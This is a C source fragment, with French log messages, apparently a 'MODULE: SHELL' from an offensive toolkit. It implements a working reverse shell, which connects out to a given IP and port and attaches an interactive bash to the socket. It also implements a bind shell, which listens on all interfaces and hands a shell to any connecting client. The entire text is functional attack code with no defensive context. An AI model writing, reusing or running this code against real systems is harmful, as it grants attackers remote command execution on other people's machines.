static void shell_reverse(const char *ip, int port) {
    int sock;
    struct sockaddr_in sa;

    INFO; printf("Connexion reverse shell → %s:%d\n", ip, port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { ERR; perror("socket"); return; }

    sa.sin_family      = AF_INET;
    sa.sin_port        = htons(port);
    sa.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr*)&sa, sizeof sa) < 0) {
        ERR; printf("Connexion échouée vers %s:%d — %s\n",
                    ip, port, strerror(errno));
        close(sock);
        return;
    }
    OK; printf("Connecté! Lancement /bin/bash...\n");

    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);
    execl("/bin/bash", "bash", "-i", NULL);
    /* fallback */
    execl("/bin/sh", "sh", "-i", NULL);
    perror("exec");
    close(sock);
}

static void shell_bind(int port) {
    int srv, cli;
    struct sockaddr_in sa;
    int opt = 1;

    INFO; printf("Bind shell en écoute sur 0.0.0.0:%d\n", port);

    srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0) { ERR; perror("socket"); return; }

    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof opt);

    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port        = htons(port);

    if (bind(srv, (struct sockaddr*)&sa, sizeof sa) < 0) {
        ERR; perror("bind"); close(srv); return;
    }
    listen(srv, 1);
    OK; printf("En attente de connexion...\n");

    socklen_t clen = sizeof sa;
    cli = accept(srv, (struct sockaddr*)&sa, &clen);
    if (cli < 0) { ERR; perror("accept"); close(srv); return; }

    OK; printf("Connexion acceptée depuis %s\n", inet_ntoa(sa.sin_addr));

    dup2(cli, STDIN_FILENO);
    dup2(cli, STDOUT_FILENO);
    dup2(cli, STDERR_FILENO);
    execl("/bin/bash", "bash", "-i", NULL);
    execl("/bin/sh", "sh", "-i", NULL);
    perror("exec");
    close(cli);
    close(srv);
}

static void module_shell(const char *ip, int port, char mode) {
    printf(MAG "\n" BANNER_LINE "\n");
    printf("  MODULE: SHELL — %s\n", mode == 'r' ? "REVERSE" : "BIND");
    printf(BANNER_LINE "\n\n" RST);

    if (mode == 'r') {
        shell_reverse(ip, port);
    } else {
        shell_bind(port);
    }
}

